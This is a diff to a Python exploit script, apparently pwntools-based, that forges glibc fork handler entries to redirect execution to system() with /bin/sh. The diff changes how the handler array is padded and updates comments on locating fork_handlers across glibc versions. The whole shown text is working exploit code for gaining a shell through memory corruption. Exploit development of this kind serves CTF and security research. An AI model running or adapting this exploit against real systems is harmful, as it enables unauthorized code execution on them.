@@ -24,14 +24,22 @@ def handler_array(*funcs):
         data = bytearray(HANDLER_SZ * len(funcs) - 0x18)
         for off, fn in zip(range(0, len(data), HANDLER_SZ), funcs[::-1]):
             data[off : off + 8] = p64(fn)
-        return bytes(data)
+        """
+        After testing, when using libc's system() and /bin/sh,
+        there's no need to fill the trailing zeros. Only if
+        writing a custom /bin/sh string, the trailing zeros
+        are needed to avoid issues, but also, just aligning to
+        8 bytes is sufficient. Add a b"\x00\x00" e.g. is enough,
+        like return bytes(data).rstrip(b'\x00') + b"\x00\x00".
+        """
+        return bytes(data).rstrip(b"\x00") + b"\x00\x00"
     else:
         data = bytearray(HANDLER_SZ * len(funcs))
         for i, fn in enumerate(funcs[::-1]):
             off = i * HANDLER_SZ
             data[off : off + 8] = p64(fn)
             data[off + 0x20 : off + 0x28] = p64(i)
-        return bytes(data)
+        return bytes(data).rstrip(b"\x00") + b"\x00\x00"
 
 
 def forge(base, *funcs, rdi=None):
@@ -61,9 +69,7 @@ log.success(f"libc base: {hex(libc.address)}")
 # objdump -d libc.so.6 | grep "<__abort_msg@@GLIBC_PRIVATE+0xbe0>"
 # For glibc 2.35:
 # objdump -d libc.so.6 | grep "<getdate_err@@GLIBC_2.2.5+0x300>"
-# Especially for glibc 2.35-0ubuntu3.11:
-# objdump -d libc.so.6 | grep "<fork_handlers>"
-# For glibc 2.36+:
+# For glibc 2.39/2.41/2.42:
 # objdump -d libc.so.6 | grep "<re_syntax_options@@GLIBC_2.2.5+0x80>"
 fork_handlers = libc.sym.re_syntax_options + 0x80
 log.success(f"fork_handlers: {hex(fork_handlers)}")
